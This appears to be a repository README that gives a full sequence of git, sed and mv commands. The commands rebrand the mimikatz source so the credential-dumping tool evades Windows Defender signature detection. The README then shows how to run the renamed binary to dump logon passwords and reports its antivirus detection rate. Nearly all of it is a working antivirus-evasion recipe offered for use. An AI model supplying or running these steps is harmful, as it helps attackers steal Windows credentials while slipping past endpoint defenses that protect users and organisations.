# Simple Mimikatz "Obfuscator"

### **Tested in**
**Defender**: Security Intelligence (yeah...) Version **1.299.423.0**

**Windows**: **1903** (OS Build **18362.239**)

## Description 
The following set of commands, will download the latest version of mimikatz and make a few changes to the source code, in order to bypass Defender. I **have only tested with logonpasswords** (**logonpassword** after the changes...). If you want other modules, and Defender complaints, i suppose that one more "sed" will do the job...

I do not really use to use mimikatz from an executable (i really prefer the "Cobalt Strike" way), but i was curious how difficult could be to bypass the Defender. 

## It is that difficult 

    git clone https://github.com/gentilkiwi/mimikatz.git windows
    mv windows/mimikatz windows/windows
    find windows/ -type f -print0 | xargs -0 sed -i 's/mimikatz/windows/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/MIMIKATZ/WINDOWS/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/Mimikatz/Windows/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/DELPY/gweep/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/Benjamin/gweeperx/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/benjamin@gentilkiwi.com/@gweeperx/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/creativecommons/notcommons/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/gentilkiwi/MSOffice/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/KIWI/ONEDRIVE/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/Kiwi/Onedrive/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/kiwi/onedrive/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/DumpCreds/DumpCred/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/logonPasswords/logonPassword/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/ArgumentPtr/NotTodayPal/g'
    find windows/ -type f -print0 | xargs -0 sed -i 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' 
    
    
    
    find windows/ -type f -name '*mimikatz*' | while read FILE ; do
    	newfile="$(echo ${FILE} |sed -e 's/mimikatz/windows/g')";
    	mv "${FILE}" "${newfile}";
    done
    find windows/ -type f -name '*kiwi*' | while read FILE ; do
    	newfile="$(echo ${FILE} |sed -e 's/kiwi/onedrive/g')";
    	mv "${FILE}" "${newfile}";
    done
    
    cd ./windows/windows/
    sed -i "0,/#if \!defined(_POWERKATZ)/! {0,/#if \!defined(_POWERKATZ)/ s/#if \!defined(_POWERKATZ)/\/*\r\n#if \!defined(_POWERKATZ)/}" windows.c
    sed -i "0,/#endif/! {0,/#endif/! {0,/#endif/ s/#endif/#endif\r\n*\//}}" windows.c

And probably not all of these are needed, but who cares.
## PoC
[https://youtu.be/OMktHYpzOi4](https://youtu.be/OMktHYpzOi4)
## How To

You can only invoke it with arguments:

> *windows.exe privilege::debug sekurlsa::**logonpassword***

## Commit

Although i targeted Defender, based on antiscan.me there is a **detection rate 9/26** . ~~I will try to bypass the 9 remaining~~  
If you find other signatures and you want to share, please feel free to commit.

## References

Of course all credits go to: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) 

This guy created this amazing tool and gave it to all of us. 

I "stole" a lot from the following articles:

[https://weekly-geekly.github.io/articles/454758/index.html?fbclid=IwAR1tAuqz7SqYE9yXoIBOruVwEQ0BueQZqmL6Gse2T6Cb1eWBma7zIceJhXY](https://weekly-geekly.github.io/articles/454758/index.html?fbclid=IwAR1tAuqz7SqYE9yXoIBOruVwEQ0BueQZqmL6Gse2T6Cb1eWBma7zIceJhXY)

[https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/?fbclid=IwAR1LQjnmRzhXnlOtMfCbPVhYgUVdgu8xRiAwOJPg-7eIFjZgjEI8--548W0](https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/?fbclid=IwAR1LQjnmRzhXnlOtMfCbPVhYgUVdgu8xRiAwOJPg-7eIFjZgjEI8--548W0)



And i almost copied paste from the following:

[https://gist.github.com/JonnyBanana/96331b350f99d267e07da16246724517](https://gist.github.com/JonnyBanana/96331b350f99d267e07da16246724517)
thx JonnyBanana

Supper difficult ha?
